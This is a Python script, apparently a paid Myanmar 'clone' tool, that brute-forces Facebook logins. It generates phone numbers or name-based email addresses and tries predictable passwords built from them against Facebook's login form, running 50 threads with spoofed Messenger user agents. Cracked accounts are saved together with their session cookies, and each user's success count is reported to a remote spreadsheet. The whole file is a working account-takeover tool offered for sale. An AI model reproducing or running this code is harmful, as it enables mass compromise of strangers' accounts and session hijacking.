import random, requests , re , sys , os , time, getpass
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    

#----------User Access Controler----------#👇

# import os, getpass, requests, sys

approval_description = ("""
\033[0mTo buy this tool,
\033[0mplease connect from Facebook or Telegram.

\033[0mFacebook acc:  https://www.facebook.com/sknaing29
\033[0mFacebook page: https://www.facebook.com/MyanService
\033[0mTelegram acc:  https://t.me/YeMoeThaung
\033[0mTelegram page: https://t.me/MyanService
""")

print("Loading...")
url = "https://raw.githubusercontent.com/mejoinpar333/Fb_Clone_Tools_Data/main/ApprovedUsers.txt"
response = requests.get(url)
approved_users = response.text

user_id = str(os.geteuid())
user_name = getpass.getuser()
key = user_id + user_name

if key in approved_users:
    print("\nYour key: " + key)
    print("Your key is approved")
    # time.sleep(2)
else:
    print("\nYour key: " + key)
    print("Your key is not approved")
    print(approval_description)
    sys.exit()

#----------User Access Controler----------#👆

#----------OK ACCOUNT RECORDER----------#👇

# import os, requests, sys, getpass
# from datetime import datetime

current_date = datetime.now().strftime("%Y-%m-%d")

# Function to save data
def save_data(filename, data):
    home_path = os.path.expanduser('~')  # Gets the user's home directory
    file_path = os.path.join(home_path, filename)  # Path to the file
    with open(file_path, 'w') as file:
        file.write(data)

# Function to load data
def load_data(filename):
    home_path = os.path.expanduser('~')  # Gets the user's home directory
    file_path = os.path.join(home_path, filename)  # Path to the file
    try:
        with open(file_path, 'r') as file:
            data = file.read()
        return data
    except FileNotFoundError:
        return "0"  # File not found.

last_ran_date = load_data(".last_ran_date")

def post_data_to_sheetdb():
    try:
        url = "https://raw.githubusercontent.com/mejoinpar333/Fb_Clone_Tools_Data/main/sheetdb_api_for_ok_recorder.txt"
        response = requests.get(url)
        api_url = response.text
        clean_string = api_url.replace(" ", "").replace("\n", "")
        api_url = clean_string
    except requests.exceptions.RequestException as e:
        # print(f"Request error: {e}")
        pass

    number_of_ok = load_data(".number_of_ok")
    date = last_ran_date
    if date == "" or date == "0":
        date = "0000-00-00"
    
    user_id = str(os.geteuid())
    user_name = getpass.getuser()
    key = user_id + user_name

    data = {
        "number_of_ok": number_of_ok,
        "date": date,
        "key": key,
        "version": "P1",
    }

    response = requests.post(api_url, json={"data": data})
"""
    if response.status_code == 201:
        print("Data successfully added.")
    else:
        print(f"Failed to add data. Status code: {response.status_code}, Response: {response.text}")
 """
def limit_id_loading():
    if last_ran_date == current_date:
        pass
    else:
        post_data_to_sheetdb()
        save_data(".last_ran_date", current_date)
        save_data(".number_of_ok", "0")

def number_of_ok():
    number_of_ok = load_data(".number_of_ok")
    int_value = int(number_of_ok)
    add_one = int_value + 1
    number_of_ok = str(add_one)
    save_data(".number_of_ok", number_of_ok)

limit_id_loading()

# You need to call the number_of_ok() function while obtaining an 'OK' account.

#----------OK ACCOUNT RECORDER----------#👆

loop = 0
oks = []
cps = []
twf =[]
ugen = []
ugen = []

cokbrut=[]
ses=requests.Session()

	
A = '\x1b[1;97m' 
B = '\033[1;32m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

dev_info = ("""
\033[1;97mFacebook acc:  \033[1;22mhttps://www.facebook.com/sknaing29
\033[1;97mFacebook page: \033[1;22mhttps://www.facebook.com/MyanService
\033[1;97mTelegram acc:  \033[1;22mhttps://t.me/YeMoeThaung
\033[1;97mTelegram page: \033[1;22mhttps://t.me/MyanService
""")

def main():
    os.system('clear')
    print(logo)
    print("\033[1;32m  ❮\033[1;97m1\033[1;32m❯ \033[1;97mPHONE NUMBER CLONE          ")
    print("\033[1;32m  ❮\033[1;97m2\033[1;32m❯\033[1;97m GMAIL UID CLONE               ")
    print("\033[1;32m  ❮\033[1;97mi\033[1;32m❯ \033[1;97mDEV'S INFO                    ")
    print("\033[1;32m  ❮\033[1;97m0\033[1;32m❯ \033[1;31mEXIT TOOL                     ")
    linex()
    ZWE = input(f'\033[1;32m  ❮\033[1;97m?\033[1;32m❯ \033[1;97mSELECT \033[1;97m:\033[1;32m ')
    if ZWE in ["1","01"]:
        phone()
    if ZWE in ["2","02"]:
        gmail_four()
    if ZWE in ["i","I"]:
        print(dev_info)
    if ZWE in ["0","X"]:        
        os.system('exit')
def phone():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[1;32m  ❮\033[1;97m✔\033[1;32m❯\033[1;97m EXAMPLE : \033[1;32m  ❮\033[1;97m789\033[1;32m❯   ❮\033[1;97m440\033[1;32m❯   ❮\033[1;97m670\033[1;32m❯")
    linex()
    code = input('\033[1;32m  ❮\033[1;97m?\033[1;32m❯\033[1;97m INPUT YOUR CODE :\033[1;32m ')
    os.system('clear')
    print(logo)
    print("\033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97mEXAMPLE : \033[1;32m  ❮\033[1;97m3000\033[1;32m❯   ❮\033[1;97m5000\033[1;32m❯   ❮\033[1;97m10000\033[1;32m❯")
    linex()
    limit=int(input("\033[1;32m  ❮\033[1;32m?\033[1;32m❯\033[1;97m INPUT YOUR LIMIT :\033[1;32m "))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=50) as LEE:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'\033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97mTOTAL ID       \x1b[38;5;45m⦿ \033[1;32m'+tl+'                   ')
        print(f'\033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97mCHOICE CODE    \x1b[38;5;45m⦿ \033[1;32m'+code+'             ')
        print(f"\033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
        linex()
        for love in user:
            country_code = "09"
            uid = "+959"+code+love
            pwx = [country_code + code + love, code + love, (country_code + code + love)[:6], (code + love)[:6]]
            # pwx = [country_code + code + love, (country_code + code + love)[::-1], code + love, (code + love)[::-1], (country_code + code + love)[:8], (code + love)[:8], (country_code + code + love)[:6], (code + love)[:6]]
            # pwx.extend(["123456", "12345678", "123456789", "abc123", "123abc", "password", "qwerty", "abcdef", "1qaz2wsx", "facebook", "account", "myanmar", "iloveyou", "fuckyou"])
            LEE.submit(rcrack,uid,pwx,tl)

def gmail_four():
                user=[]
                os.system('clear')
                print(logo)               
                print("\033[1;32m  ❮\033[1;97m✔\033[1;32m❯\033[1;97mEXAMPLE : \033[1;32m  ❮\033[1;97mtun\033[1;32m❯   ❮\033[1;97mzaw\033[1;32m❯   ❮\033[1;97maung\033[1;32m❯ ")
                linex()
                first = input('\033[1;32m  ❮\033[1;97m?\033[1;32m❯\033[1;97mFIRST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m  ❮\033[1;97m✔\033[1;32m❯\033[1;97mEXAMPLE : \033[1;32m  ❮\033[1;97mlin\033[1;32m❯   ❮\033[1;97mhtet\033[1;32m║   ❮\033[1;97mmin\033[1;32m❯ ")
                linex()
                last = input('\033[1;32m  ❮\033[1;97m?\033[1;32m❯\033[1;97mLAST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m  ❮\033[1;97m✔\033[1;32m❯\033[1;97mEXAMPLE : \033[1;32m  ❮\033[1;97m@gmail.com\033[1;32m❯   ❮\033[1;97m@yahoo.com\033[1;32m❯ ")
                linex()
                domain = input('\033[1;32m  ❮\033[1;97m?\033[1;32m❯\033[1;97mINPUT DOMAIN :\033[1;32m ')               
                os.system('clear')
                print(logo)
                print("\033[1;32m  ❮\033[1;97m✔\033[1;32m❯\033[1;97mEXAMPLE : \033[1;32m  ❮\033[1;97m3000\033[1;32m❯   ❮\033[1;97m5000\033[1;32m❯   ❮\033[1;97m10000\033[1;32m❯ ")
                linex()
                try:
                        limit=int(input("\033[1;32m  ❮\033[1;97m?\033[1;32m❯\033[1;97mINPUT YOUR LIMIT :\033[1;32m "))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp="".join(random.choice(string.digits) for _ in range(1,5))
                        user.append(nmp)                               
                with ThreadPool(max_workers=50) as LEE:
                        tl = str(len(user))
                        os.system('clear')
                        print(logo)
                        print(f'\033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97mTOTAL ID       \x1b[38;5;45m⦿ \033[1;32m'+tl+'  ')
                        print(f'\033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97mCRACK NAME     \x1b[38;5;45m⦿ \033[1;32m'+first+'.'+last+'.xxxx'+domain+'')
                        print(f"  \033[1;32m    ❮\033[1;97m✔\033[1;32m❯ \033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
                        linex()
                        for digitx in user:                       
                                uid=first+'.'+last+'.'+digitx+domain
                                pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
                                LEE.submit(rcrack,uid,pwx,tl)                
    
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    global android_version
    global model
    try:
        for ps in pwx:
            session = requests.Session()
            pro = generate_messenger_user_agent()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r\r\033[1;32m  ❮%sMYAN-2\033[1;32m❯\033[1;34m\033[1;32m ❮\033[38;5;195m%s/%s\033[1;32m❯\033[1;32m OK-%s\r'%(bi,loop,tl,len(oks))),            
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            
            android_version = android_version + ".0.0"
            header_freefb = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'dpr': '2.625',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"' + model + '"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"' + android_version + '"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': pro,
                'viewport-width': '980',
            }
            
            lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                print(f"\033[1;32m  ❮✔❯ {uid} ⦿ {ps}" '  \n\033[1;97m  ❮COOKIE❯ = \033[1;97m'+coki+  '')
                linex()
                open('/sdcard/MYAN-2-OK.txt', 'a').write( uid + ' | ' + ps + '\nCookie = ' + coki + '\nUser-Agent = ' + pro + '\n\n')
                oks.append(uid)
                number_of_ok()
                break
            elif 'checkpoint' in log_cookies:            	
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[82:97]
                print(f"\x1b[1;90m  ❮✘❯ {uid} ⦿ {ps}")
                #print(f'\033[1;31m  ❮COOKIE❯ = {coki}')
                open('/sdcard/MYAN-2-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break            
            else:
                continue
        loop+=1
        
    except:
        pass
        

def generate_messenger_user_agent():
    # Define a list of device configurations with added 'fbbv' attribute
    device_configurations = [
        {'brand1': 'samsung', 'brand2': 'samsung', 'model': 'SM-G991B', 'android_version': '12', 'build': 'SP1A.210812.016', 'density': '3.0', 'width': '1080', 'height': '2400'},
        {'brand1': 'samsung', 'brand2': 'samsung', 'model': 'SM-G998B', 'android_version': '12', 'build': 'SP1A.210812.016', 'density': '4.0', 'width': '1440', 'height': '3200'},
        {'brand1': 'samsung', 'brand2': 'samsung', 'model': 'SM-S906N', 'android_version': '12', 'build': 'SP1A.210812.016', 'density': '3.0', 'width': '1080', 'height': '2340'},
        {'brand1': 'samsung', 'brand2': 'samsung', 'model': 'SM-S908B', 'android_version': '13', 'build': 'SP1A.210812.016', 'density': '4.0', 'width': '1440', 'height': '3088'},
        {'brand1': 'samsung', 'brand2': 'samsung', 'model': 'SM-F926B', 'android_version': '11', 'build': 'RP1A.200720.012', 'density': '4.0', 'width': '1768', 'height': '2208'},
        {'brand1': 'samsung', 'brand2': 'samsung', 'model': 'SM-F711B', 'android_version': '13', 'build': 'TP1A.220624.014', 'density': '3.0', 'width': '1080', 'height': '2640'},
        {'brand1': 'samsung', 'brand2': 'samsung', 'model': 'SM-A125U', 'android_version': '10', 'build': 'QP1A.190711.020', 'density': '2.0', 'width': '720', 'height': '1600'},
        {'brand1': 'samsung', 'brand2': 'samsung', 'model': 'SM-A426U', 'android_version': '12', 'build': 'SP1A.210812.016', 'density': '2.0', 'width': '720', 'height': '1600'},
        {'brand1': 'samsung', 'brand2': 'samsung', 'model': 'SM-A725F', 'android_version': '11', 'build': 'RP1A.200720.012', 'density': '3.0', 'width': '1080', 'height': '2400'},
        {'brand1': 'samsung', 'brand2': 'samsung', 'model': 'SM-A135F', 'android_version': '12', 'build': 'SP1A.210812.016', 'density': '3.0', 'width': '1080', 'height': '2408'},
    ]
    
    # Please add the all facebook versions from file to list and give me modify list.
    # Example - fb_versions = ['70.0.3538.77', '80.0.3987.149', '90.0.4430.212', '89.0.4389.82', '88.0.4324.181', all versions from file]
    fbav_versions = [
        '180.0.0.10', '195.0.0.45', '250.0.0.20',
        '344.0.0.8', '345.0.0.10', '345.1.0.12', '346.0.0.7', '347.0.0.8',
        '348.0.0.6', '348.0.0.11', '349.0.0.7', '350.0.0.9', '350.1.0.9',
        '351.1.0.12', '352.0.0.9', '353.0.0.12', '354.0.0.10', '355.0.0.17',
        '356.0.0.13', '357.0.0.13', '358.0.0.13', '359.0.0.6', '361.0.0.7',
        '362.0.0.8', '364.0.0.10', '365.0.0.20', '366.0.0.10', '367.0.0.9',
        '368.0.0.12', '369.0.0.7', '370.0.0.14', '371.0.0.11', '371.1.0.12',
        '372.0.0.10', '374.0.0.23', '375.0.0.17', '376.0.0.22', '377.0.0.13',
        '378.0.0.25', '379.0.0.22', '379.1.0.23', '380.1.0.17', '381.0.0.17',
        '382.0.0.20', '383.0.0.14', '384.0.0.18', '386.0.0.19', '386.2.0.22',
        '387.0.0.22', '388.0.0.23', '389.1.0.23', '390.2.0.29', '391.1.0.20',
        '448.0.0.47'
    ]  # Facebook Messenger app version

    fbbvs = [
        '100000123', '100000456', '100000789',
        '170667797', '298810789', '299012000', '299012641', '299211759',
        '299411695', '299610917', '299611517', '299810824', '300011368',
        '300011552', '300212154', '300411983', '300612197', '300811873',
        '301015357', '301216979', '301418139', '301620838', '301817096',
        '302210495', '302410800', '302811438', '303012220', '303211178',
        '303411086', '303610710', '303810652', '304011112', '304210738',
        '304210970', '304411062', '304812422', '305011312', '305212156',
        '305410679', '305613180', '305812658', '305812862', '306011754',
        '306210994', '306412184', '306611966', '306811448', '307210803',
        '307211203', '307408604', '307610879', '307815955', '308006993',
        '308219344', '319609331', '710453066'
    ]  # Facebook Messenger Build Version, unique identifier for the app build

    locales = [
        'en_US', 'th_TH', 'de_DE', 'fr_FR', 'es_ES', 'it_IT', 'ru_RU', 'ja_JP', 'ko_KR', 'pt_BR',
        'zh_CN', 'zh_TW', 'ar_SA', 'hi_IN', 'bn_BD', 'tr_TR', 'vi_VN', 'pl_PL', 'uk_UA', 'nl_NL',
        'sv_SE', 'da_DK', 'fi_FI', 'no_NO', 'el_GR', 'id_ID', 'ro_RO', 'hu_HU', 'cs_CZ', 'sk_SK'
    ]

    carriers = [
        'Verizon', 'AT&T', 'T-Mobile', 'Sprint', 'Vodafone', 'AIS', 'DTAC', 'Orange', 'Telefónica', 'NTT Docomo',
        'China Mobile', 'MTS', 'Telecom Italia', 'Rogers Wireless', 'Bell Canada', 'Telus', 'Bharti Airtel', 'Reliance Jio',
        'O2', 'SFR', 'Movistar', 'TIM', 'Three', 'Optus', 'Telstra', 'SK Telecom', 'KDDI', 'SoftBank', 'Megafon'
    ]
    # Randomly select a device configuration
    device_config = random.choice(device_configurations)

    # Extract details from the chosen configuration
    brand1 = device_config['brand1']
    brand2 = device_config['brand2']
    global model
    model = device_config['model']
    global android_version
    android_version = device_config['android_version']
    build = device_config['build']
    density = device_config['density']
    width = device_config['width']
    height = device_config['height']
    
    fbav = random.choice(fbav_versions)  # Facebook Messenger app version
    fbbv = random.choice(fbbvs)  # Build version of the Facebook Messenger app
    locale = random.choice(locales)
    carrier = random.choice(carriers)

    # Construct the user agent string using the extracted details
    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {model} Build/{build}) "
        f"[FBAN/Orca-Android;FBAV/{fbav};FBBV/{fbbv};FBPN/com.facebook.orca;FBLC/{locale};"  
        f"FBCR/{carrier};FBMF/{brand1};FBBD/{brand2};FBDV/{model};FBSV/{android_version};"
        f"FBCA/armeabi-v7a:armeabi;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]"
    )
    
    return ua
    
    
logo= ("""
\033[1;22mDalvik-StandardA1 ug-header SCRAPE v2 P1
\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\033[38;5;45m┃  ███    ███ ██    ██  █████  ███    ██     ██████   ┃
\033[38;5;44m┃  ████  ████  ██  ██  ██   ██ ████   ██          ██  ┃
\033[38;5;43m┃  ██ ████ ██   ████   ███████ ██ ██  ██      █████   ┃
\033[38;5;42m┃  ██  ██  ██    ██    ██   ██ ██  ██ ██     ██       ┃
\033[38;5;41m┃  ██      ██    ██    ██   ██ ██   ████     ███████  ┃
\033[1;32m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
\033[38;5;45m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mOWNER           \033[38;5;41m ━━━━━    \033[1;32m MyanService          \033[38;5;45m┃
\033[38;5;43m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mTELEGRAM        \033[38;5;41m ━━━━━   \033[1;32m @MyanService          \033[38;5;43m┃
\033[38;5;43m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mMETHOD          \033[38;5;41m ━━━━━   \033[1;32mSCRAPE METHOD          \033[38;5;43m┃
\033[38;5;44m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mTOOL STATUS     \033[38;5;41m ━━━━━    \033[1;32mPAID VERSION          \033[38;5;44m┃
\033[38;5;42m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mTOOL VERSION    \033[38;5;41m ━━━━━     \033[1;32m      1.0.0          \033[38;5;42m┃
\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
def linex():
	print(f'\033[1;97m ══════════════════════════════════════════════════════')

main()
